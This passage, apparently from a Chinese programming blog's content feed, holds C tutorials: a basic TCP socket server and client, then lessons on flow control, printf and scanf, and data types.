punctuation">;</span>       exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    //当客户端按下ctrl c时服务器端自动结束，否则服务器会一直循环    //设置信号量进行控制    if<span class="token punctuation">(</span>signal<span class="token punctuation">(</span>SIGINT, signal_handler<span class="token punctuation">)</span><span class="token operator">==</span> SIG_ERR<span class="token punctuation">)</span><span class="token punctuation">{</span>        perror<span class="token punctuation">(</span><span class="token string">"信号量错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        //创建文件    FILE *f<span class="token punctuation">;</span>    //创建套接字，SOCK_STREAM使用TCP    sockfd <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET,SOCK_STREAM,0<span class="token punctuation">)</span><span class="token punctuation">;</span>    //在绑定函数之前对套接字进行初始化操作    struct sockaddr_in server_addr<span class="token punctuation">;</span>//套接字地址    struct sockaddr_in client_addr<span class="token punctuation">;</span>    memset<span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr,0,sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span><span class="token punctuation">;</span>//对套接字地址进行清空操作    server_addr.sin_family <span class="token operator">=</span>AF_INET<span class="token punctuation">;</span>//与套接字协议保持一致,IPV4    server_addr.sin_port <span class="token operator">=</span> htons<span class="token punctuation">(</span>atoi<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">;</span>//将端口号转换字节序，命令行传入的第二个参数为端口号，atoi将其强制转换为整形    server_addr.sin_addr.s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>//响应所有接口的链接请求    //绑定端口号、IP    int bindno<span class="token punctuation">;</span>//用于错误处理    bindno <span class="token operator">=</span> bind<span class="token punctuation">(</span>sockfd,<span class="token punctuation">(</span>struct sockaddr *<span class="token punctuation">)</span><span class="token operator">&amp;</span>server_addr, sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>bindno <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span><span class="token punctuation">{</span>       perror<span class="token punctuation">(</span><span class="token string">"绑定出错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    //在指定端口进行监听    int listenno<span class="token punctuation">;</span>//错误处理    listenno <span class="token operator">=</span> listen<span class="token punctuation">(</span>sockfd,128<span class="token punctuation">)</span><span class="token punctuation">;</span>//最多同时允许128个客户端请求建立链接        if<span class="token punctuation">(</span>listenno <span class="token operator">&lt;</span>0<span class="token punctuation">)</span><span class="token punctuation">{</span>       perror<span class="token punctuation">(</span><span class="token string">"监听出错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    //调用accept函数阻塞直到等待客户端请求连接    socklen_t client_addr_len <span class="token operator">=</span> sizeof<span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>//定义客户端套接字长度    while<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">{</span>         int cfd<span class="token punctuation">;</span>//客户端文件描述符         cfd <span class="token operator">=</span> accept<span class="token punctuation">(</span>sockfd, <span class="token punctuation">(</span>struct sockaddr *<span class="token punctuation">)</span><span class="token operator">&amp;</span>client_addr, <span class="token operator">&amp;</span>client_addr_len<span class="token punctuation">)</span><span class="token punctuation">;</span>         if<span class="token punctuation">(</span>cfd <span class="token operator">&lt;</span>0<span class="token punctuation">)</span><span class="token punctuation">{</span>            perror<span class="token punctuation">(</span><span class="token string">"接收失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>//继续获得         <span class="token punctuation">}</span>         //read函数读取客户端信息         out_addr<span class="token punctuation">(</span><span class="token operator">&amp;</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>//获取客户端地址信息         do_service<span class="token punctuation">(</span>cfd<span class="token punctuation">)</span><span class="token punctuation">;</span>//对客户端文件进行相关操作         f<span class="token operator">=</span> fopen<span class="token punctuation">(</span><span class="token string">"client_IP.txt"</span>,<span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         fprintf<span class="token punctuation">(</span>f,<span class="token string">"用户IP：%s,请求时间:%s"</span>,IP,str<span class="token punctuation">)</span><span class="token punctuation">;</span>         fclose<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>             close<span class="token punctuation">(</span>cfd<span class="token punctuation">)</span><span class="token punctuation">;</span>//关闭客户端套接字        <span class="token punctuation">}</span>    fclose<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;stdlib.h></span><span class="token comment" spellcheck="true">#include &lt;stdio.h></span><span class="token comment" spellcheck="true">#include &lt;netdb.h></span><span class="token comment" spellcheck="true">#include &lt;string.h></span><span class="token comment" spellcheck="true">#include &lt;sys/socket.h></span><span class="token comment" spellcheck="true">#include &lt;arpa/inet.h></span><span class="token comment" spellcheck="true">#include &lt;memory.h></span><span class="token comment" spellcheck="true">#include &lt;unistd.h></span>int main<span class="token punctuation">(</span>int argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    if<span class="token punctuation">(</span>argc<span class="token operator">&lt;</span>3<span class="token punctuation">)</span><span class="token punctuation">{</span>      printf<span class="token punctuation">(</span><span class="token string">"用户:%s IP #port\n"</span>,argv<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    //创建套接字    int sockfd <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET,SOCK_STREAM,0<span class="token punctuation">)</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>sockfd<span class="token operator">&lt;</span>0<span class="token punctuation">)</span><span class="token punctuation">{</span>       perror<span class="token punctuation">(</span><span class="token string">"套接字出错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    struct sockaddr_in server_addr<span class="token punctuation">;</span>    memset<span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr,0,sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span><span class="token punctuation">;</span>    server_addr.sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr.sin_port <span class="token operator">=</span> htons<span class="token punctuation">(</span>atoi<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">;</span>//转换字节序    //将IP地址转换成网络字节序    inet_pton<span class="token punctuation">(</span>AF_INET,argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span>,<span class="token operator">&amp;</span>server_addr.sin_addr.s_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    //调用connect请求与服务器建立连接    int a<span class="token punctuation">;</span>    a <span class="token operator">=</span> connect<span class="token punctuation">(</span>sockfd,<span class="token punctuation">(</span>struct sockaddr *<span class="token punctuation">)</span><span class="token operator">&amp;</span>server_addr, sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>a<span class="token operator">&lt;</span>0<span class="token punctuation">)</span><span class="token punctuation">{</span>      perror<span class="token punctuation">(</span><span class="token string">"连接出错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        //调用IO函数与服务器进行通信    //提供一个缓冲区给服务器放置时间    char buf<span class="token punctuation">[</span>1024<span class="token punctuation">]</span><span class="token punctuation">;</span>    memset<span class="token punctuation">(</span><span class="token operator">&amp;</span>buf,0,sizeof<span class="token punctuation">(</span>buf<span class="token punctuation">))</span><span class="token punctuation">;</span>//清空缓冲区    size_t size<span class="token punctuation">;</span>    size <span class="token operator">=</span> read<span class="token punctuation">(</span>sockfd, buf,sizeof<span class="token punctuation">(</span>buf<span class="token punctuation">))</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>size<span class="token operator">&lt;</span>0<span class="token punctuation">)</span><span class="token punctuation">{</span>        perror<span class="token punctuation">(</span><span class="token string">"读取错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    //将日期写在屏幕上    write<span class="token punctuation">(</span>STDOUT_FILENO,buf,size<span class="token punctuation">)</span><span class="token punctuation">;</span>        //关闭套接字    close<span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言(三)</title>
      <link href="/2019/08/08/c-3/"/>
      <url>/2019/08/08/c-3/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是流程控制"><a href="#什么是流程控制" class="headerlink" title="什么是流程控制"></a>什么是流程控制</h2><p>定义：程序代码执行的顺序</p><h2 id="流程控制的分类"><a href="#流程控制的分类" class="headerlink" title="流程控制的分类"></a>流程控制的分类</h2><h3 id="顺序执行"><a href="#顺序执行" class="headerlink" title="顺序执行"></a>顺序执行</h3><p>按照代码顺序执行</p><h3 id="选择执行"><a href="#选择执行" class="headerlink" title="选择执行"></a>选择执行</h3><p>定义：某些代码可能执行，也可能不执行，有选择的执行某些代码</p><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><h5 id="if最简单的用法"><a href="#if最简单的用法" class="headerlink" title="if最简单的用法"></a>if最简单的用法</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">{</span>   语句<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//若表达式为真则执行语句，否则不执行</span><span class="token punctuation">}</span></code></pre><h5 id="if的范围问题"><a href="#if的范围问题" class="headerlink" title="if的范围问题"></a>if的范围问题</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>   语句A；   语句B；</code></pre><p><font color="#fb8c00">if</font>默认只控制语句A的执行与不执行，不控制语句B，即B一定会被执行</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">{</span>    语句A；    语句B；<span class="token punctuation">}</span></code></pre><p>此时<font color="#fb8c00">if</font>可控制AB</p><blockquote><p>注：if默认只控制一个语句的执行</p></blockquote><h5 id="if-else的用法"><a href="#if-else的用法" class="headerlink" title="if else的用法"></a>if else的用法</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">{</span>    语句A；<span class="token comment" spellcheck="true">//若表达式为真执行A；</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    语句B；<span class="token comment" spellcheck="true">//若表达式为假执行B；</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：else默认只控制一个语句的执行<br>      else后不跟表达式</p></blockquote><h5 id="if…else-if…else的用法"><a href="#if…else-if…else的用法" class="headerlink" title="if…else if…else的用法"></a>if…else if…else的用法</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">)</span>     语句A；<span class="token comment" spellcheck="true">//若1成立执行A</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>表达式<span class="token number">2</span><span class="token punctuation">)</span>    语句B；<span class="token comment" spellcheck="true">//若1不成立2成立执行B</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">3</span><span class="token punctuation">)</span>    语句C；<span class="token comment" spellcheck="true">//若12不成立3成立执行C</span><span class="token keyword">else</span>     语句D；<span class="token comment" spellcheck="true">//若123不成立则执行D</span></code></pre><h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">switch</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        语句A<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        语句B<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>        语句C<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：没有break则按顺序执行，case是程序入口，一旦找到入口程序将从入口按顺序执行，不再进行判断(switch只进行一次判断)，break是程序出口。</p></blockquote><h3 id="循环执行"><a href="#循环执行" class="headerlink" title="循环执行"></a>循环执行</h3><p>定义：某些代码会被重复执行</p><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    语句A；<span class="token punctuation">}</span></code></pre><p><font color="#fb8c00">for</font>语句执行顺序：先执行int i=1,再判断i&lt;=4,若i&lt;=4为真，则执行语句A，最后执行i++,再对i&lt;=4进行判断</p><blockquote><p>注：i++与++i的区别<br>a = i++ 相当于a=i, i=i+1,即先赋值再计算;<br>a = ++i 相当于i=i+1,a=i，即先计算再赋值;</p></blockquote><h5 id="嵌套for循环"><a href="#嵌套for循环" class="headerlink" title="嵌套for循环"></a>嵌套for循环</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">)</span>      A<span class="token punctuation">;</span>      B<span class="token punctuation">;</span></code></pre><p>上述表达式执行顺序(循环一次)：1-2-4-5-A-6-5-3-2-B</p><h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>   语句A；</code></pre><h4 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do while循环"></a>do while循环</h4><p>主要用于人机交互</p><pre class=" language-c"><code class="language-c"><span class="token keyword">do</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>；</code></pre><blockquote><p>注： while和for可能一次都不会执行，但是do while至少执行一次。</p></blockquote><h2 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h2><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><ul><li>break如果用于循环用来终止循环</li><li>break如果用于switch，用于终止switch(程序出口)</li><li>break不能直接用于if，除非if属于循环内部的一个子句</li></ul><h4 id="break用于for循环"><a href="#break用于for循环" class="headerlink" title="break用于for循环"></a>break用于for循环</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//OK,用于终止外部for循环</span><span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        语句A<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//OK,终止第二个for循环</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="break用于switch"><a href="#break用于switch" class="headerlink" title="break用于switch"></a>break用于switch</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span><span class="token keyword">switch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//第一个switch</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//第二个switch</span>           <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>               语句A；               <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//终止的是第二个switch</span>        <span class="token punctuation">}</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//终止的是第一个switch</span><span class="token punctuation">}</span></code></pre><blockquote><p>注:在多层for循环中，break只能终止距离它最近的循环；<br>    在多层switch嵌套中，break只能终止距离它最近的switch;</p></blockquote><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><h4 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h4><p>用于跳过本次循环余下的语句，转去判断是否需要执行下次循环</p><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    语句A<span class="token punctuation">;</span>    语句B<span class="token punctuation">;</span>    <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//若执行该语句，则执行完AB后直接执行表达式3，不执行语句C</span>    语句C<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言(二)</title>
      <link href="/2019/08/07/c-2/"/>
      <url>/2019/08/07/c-2/</url>
      
        <content type="html"><![CDATA[<h2 id="输出printf"><a href="#输出printf" class="headerlink" title="输出printf()"></a>输出printf()</h2><h3 id="输出形式"><a href="#输出形式" class="headerlink" title="输出形式"></a>输出形式</h3><p>将变量的内容输出到显示器上</p><ul><li>printf(“字符串”);<pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你好\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//\n表示换行</span></code></pre></li><li>printf(“输出控制符”，输出参数);<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将i以十进制的方式输出</span></code></pre></li><li>printf(“输出控制符1 输出控制符2..”，输出参数1，输出参数2，….)<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d %d\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//OK</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//error,输出控制符与参数个数不匹配</span></code></pre></li><li>printf(“输出控制符 非输出控制符”，输出参数);<br> 输出控制符包含： %d, %ld, %f, %lf, %C, %x,%s…<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"j = %d, k= %d\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>注：float只能用%f输出不能用%d</p></blockquote></li></ul><h3 id="为什么需要输出控制符"><a href="#为什么需要输出控制符" class="headerlink" title="为什么需要输出控制符"></a>为什么需要输出控制符</h3><ul><li>01组成的代码可以表示数据也可以表示指令，通过输出控制符表示告诉编译器如何解读</li><li>如果01代码表示的是数据，同样01代码组组合以不同输出格式输出就会有不同的输出结果。</li></ul><h2 id="输入scanf"><a href="#输入scanf" class="headerlink" title="输入scanf()"></a>输入scanf()</h2><p>通过键盘将数据放置到变量中</p><h3 id="输入形式"><a href="#输入形式" class="headerlink" title="输入形式"></a>输入形式</h3><ul><li>scanf(“输入控制符”，输入参数);<br>功能： 将键盘输入的字符转化为输入控制符所规定的格式的数据，然后存入以输入参数的值为地址的变量中。<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//&amp;表示取地址,将键盘输入的字符转换为int类型再赋值给i</span></code></pre></li><li>scanf(“非输入控制符输入控制符”，输入参数)；<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"m%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输入123，m123均为合法输入</span></code></pre></li><li>scanf(“输入控制符1 输入控制符2…”,输入参数1,输入参数2…);<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输入应为1空格2，12被视为一个数字</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d,%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输入应为1逗号2，若为1空格2只读取1，2置为填充字</span></code></pre></li></ul><p>###对用户非法输入的处理<br>在连续输入的两个scanf函数之间加入代码</p><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> ch<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ch<span class="token punctuation">.</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：1、使用scanf前最好先使用printf提示用户输入格式<br>      2、scanf中尽量不要使用非输入控制符，尤其是转义字符\n。</p></blockquote><h3 id="为什么需要输入控制符"><a href="#为什么需要输入控制符" class="headerlink" title="为什么需要输入控制符"></a>为什么需要输入控制符</h3><p>操作系统接收键盘输入的数字都以字符接收，需要输入控制符将其转换为所需格式的数据。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言(一)</title>
      <link href="/2019/08/06/c-1/"/>
      <url>/2019/08/06/c-1/</url>
      
        <content type="html"><![CDATA[<h2 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h2><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><ul><li>整数：<br> 整形 <font color="#fb8c00">int</font><br> 短整型 <font color="#fb8c00 ">short int</font><br> 长整型 <font color="#fb8c00" >long int</font></li><li>浮点数：<br> 单精度浮点数 <font color="#fb8c00">float</font><br> 双精度浮点数 <font color="#fb8c00">double</font></li><li>字符：<br> 单个字符 <font color="#fb8c00">char</font></li><li>复合数据类型<br> 结构体<br> 枚举  </li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="[变量"></a>[变量</h3><ul><li>变量的本质就是内存中的一段存储空间</li><li>变量必须初始化(赋值)，如果不赋值最终输出为填充字(垃圾值)。</li></ul><h3 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h3><pre class=" language-bash"><code class="language-bash">int i <span class="token operator">=</span> 17<span class="token punctuation">;</span>printf<span class="token punctuation">(</span><span class="token string">"i = %d\n"</span>,i<span class="token punctuation">)</span><span class="token punctuation">;</span>//%d表示以十进制输出//%x表示以十六进制输出//%o表示以八进制输出</code></pre><h3 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h3><p>字节是存储数据的单位，并且是硬件所能访问的最小单位。(1字节=8bit, 1K=1024字节，1M =1024K,1G=1024M)</p><h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p> 不是一个值，而是一种规定，规定不同的字符是使用哪个整数值去表示。eg : ‘A’–65,’B’–66</p><pre class=" language-bash"><code class="language-bash">char ch <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>//OKchar ch <span class="token operator">=</span> <span class="token string">'B'</span><span class="token punctuation">;</span>//error,ch被重复定义ch <span class="token operator">=</span> <span class="token string">'B'</span><span class="token punctuation">;</span>//OK,把B赋值给ch</code></pre><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ul><li>整数：<br> 十进制：<font color="#fb8c00">17</font><br> 八进制：<font color="#fb8c00">017(数字0)</font><br> 十六进制：<font color="#fb8c00">0x17 或 0X17</font></li><li>浮点数：<br> 传统写法：<font color="#fb8c00">3.2</font><br> 科学计数法：<font color="#fb8c00">3.2e3</font>(值为3200)，<font color="#fb8c00">1234.5e-2</font>(值为12.345)</li><li>字符：<br> 单个字符：<font color="#fb8c00">‘a’</font><br> 字符串：<font color="#fb8c00"> “aa”</font><blockquote><p>注： “a”是正确的，因为”a”表示’a’和’\0’的组合</p></blockquote></li><li>存储方式<br> 字符：’A’先转为ASCII码，再转换为补码(本质上与整数存储方式相同)<br> 整数：以补码形式转换为二进制代码存储在计算机中<br> 实数：以IEEE754标准转换为二进制代码存储在计算机中</li></ul><h2 id="强制数据类型转换"><a href="#强制数据类型转换" class="headerlink" title="强制数据类型转换"></a>强制数据类型转换</h2><p>格式：(数据类型)(表达式)<br>功能：把表达式的值强制转换为前面所执行的数据类型</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token punctuation">(</span>4.5+2.2<span 